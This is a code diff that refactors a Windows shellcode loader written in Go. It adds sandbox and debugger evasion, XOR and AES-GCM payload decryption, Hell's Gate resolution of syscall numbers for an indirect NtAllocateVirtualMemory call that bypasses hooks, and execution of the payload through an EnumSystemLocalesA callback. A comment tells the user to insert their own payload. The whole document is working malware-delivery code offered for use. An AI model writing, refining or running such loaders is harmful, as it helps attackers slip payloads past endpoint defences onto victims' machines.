@@ -1,8 +1,10 @@
+//go:build windows
 package main
 
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"errors"
 	"os"
 	"runtime"
 	"syscall"
@@ -10,7 +12,7 @@ import (
 	"unsafe"
 )
 
-// Link the assembly function
+// indirectSyscall links to the ASM stub
 func indirectSyscall(ssn uint16, syscallAddr uintptr, handle uintptr, addr *uintptr, zeroBits uintptr, size *uintptr, allocType uintptr, protect uintptr) uintptr
 
 var (
@@ -22,52 +24,122 @@ var (
 	enumLocales   = k32.NewProc("EnumSystemLocalesA")
 )
 
+// checkEnvironment performs basic sandbox evasion
 func checkEnvironment() {
-	if runtime.NumCPU() < 2 { os.Exit(0) }
+	if runtime.NumCPU() < 2 {
+		os.Exit(0)
+	}
 	start := time.Now()
 	time.Sleep(50 * time.Millisecond)
-	if time.Since(start) < 50*time.Millisecond { os.Exit(0) }
+	if time.Since(start) < 50*time.Millisecond {
+		os.Exit(0)
+	}
 	isDebugger := k32.NewProc("IsDebuggerPresent")
-	res, _, _ := isDebugger.Call()
-	if res != 0 { os.Exit(0) }
+	if res, _, _ := isDebugger.Call(); res != 0 {
+		os.Exit(0)
+	}
 }
 
-func unpack(data []byte, aesKey []byte, xorKey byte) []byte {
-	for i := range data { data[i] ^= xorKey }
-	block, _ := aes.NewCipher(aesKey)
-	gcm, _ := cipher.NewGCM(block)
+// resolveSyscall implements "Hell's Gate" logic to find SSN and Syscall address
+func resolveSyscall(proc *syscall.LazyProc) (uint16, uintptr, error) {
+	ptr := proc.Addr()
+	if ptr == 0 {
+		return 0, 0, errors.New("could not resolve proc address")
+	}
+
+	// Standard NTAPI stub check: mov eax, <SSN> (B8 XX XX XX XX)
+	// The SSN is usually 4 bytes into the function
+	ssn := *(*uint16)(unsafe.Pointer(ptr + 4))
+
+	// Search for the 'syscall' opcode (0F 05) within the first 32 bytes
+	var syscallAddr uintptr
+	for i := 0; i < 32; i++ {
+		b1 := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
+		b2 := *(*byte)(unsafe.Pointer(ptr + uintptr(i+1)))
+		if b1 == 0x0F && b2 == 0x05 {
+			syscallAddr = ptr + uintptr(i)
+			break
+		}
+	}
+
+	if syscallAddr == 0 {
+		return 0, 0, errors.New("syscall instruction not found")
+	}
+
+	return ssn, syscallAddr, nil
+}
+
+// unpack handles AES-256-GCM and XOR de-obfuscation with safety checks
+func unpack(data []byte, aesKey []byte, xorKey byte) ([]byte, error) {
+	if len(aesKey) != 32 {
+		return nil, errors.New("invalid AES key length (must be 32)")
+	}
+
+	for i := range data {
+		data[i] ^= xorKey
+	}
+
+	block, err := aes.NewCipher(aesKey)
+	if err != nil {
+		return nil, err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+
 	nonceSize := gcm.NonceSize()
-	decrypted, _ := gcm.Open(nil, data[:nonceSize], data[nonceSize:], nil)
-	return decrypted
+	if len(data) < nonceSize {
+		return nil, errors.New("payload too short for nonce")
+	}
+
+	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
+	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
 func main() {
 	checkEnvironment()
 
-	packedPayload := []byte{0xde, 0xad, 0xbe, 0xef} // Placeholder
+	// Replace with your actual packed payload and 32-byte key
+	packedPayload := []byte{ /* ... */ }
 	aesKey := []byte("32-byte-key-for-aes-256-standard")
 	xorKey := byte(0xFF)
 
-	decrypted := unpack(packedPayload, aesKey, xorKey)
+	if len(packedPayload) == 0 {
+		return
+	}
 
-	// Layer 3: Indirect Syscall for Allocation (NtAllocateVirtualMemory)
-	// Finding the SSN (0x18 for Win10/11) and the 'syscall' instruction address
+	decrypted, err := unpack(packedPayload, aesKey, xorKey)
+	if err != nil || len(decrypted) == 0 {
+		return
+	}
+
+	// Dynamic Resolution via Hell's Gate
 	ntAlloc := nt.NewProc("NtAllocateVirtualMemory")
-	ssn := uint16(0x18)
-	syscallInst := ntAlloc.Addr() + 0x12 
+	ssn, syscallInst, err := resolveSyscall(ntAlloc)
+	if err != nil {
+		return
+	}
 
 	var baseAddress uintptr
 	size := uintptr(len(decrypted))
-	
-	// Perform the allocation indirectly to bypass hooks on NtAllocateVirtualMemory
-	indirectSyscall(ssn, syscallInst, uintptr(0xffffffffffffffff), &baseAddress, 0, &size, 0x3000, 0x04)
 
-	// Layer 4: Manual Memory Bridge
-	rtlMoveMemory.Call(baseAddress, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)))
+	// Indirect Syscall: NtAllocateVirtualMemory (0xffffffffffffffff = Current Process)
+	status := indirectSyscall(ssn, syscallInst, uintptr(0xffffffffffffffff), &baseAddress, 0, &size, 0x3000, 0x04)
+	if status != 0 {
+		return
+	}
 
+	// Move decrypted data to manual buffer
+	_, _, _ = rtlMoveMemory.Call(baseAddress, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)))
+
+	// Protect: Transition to PAGE_EXECUTE_READ (0x20)
 	var oldProtect uint32
-	vProtect.Call(baseAddress, uintptr(len(decrypted)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
+	if ret, _, _ := vProtect.Call(baseAddress, uintptr(len(decrypted)), 0x20, uintptr(unsafe.Pointer(&oldProtect))); ret == 0 {
+		return
+	}
 
-	// Layer 5: Stealth Trigger
-	enumLocales.Call(baseAddress, 0)
+	// Execute via System Callback
+	_, _, _ = enumLocales.Call(baseAddress, 0)
 }
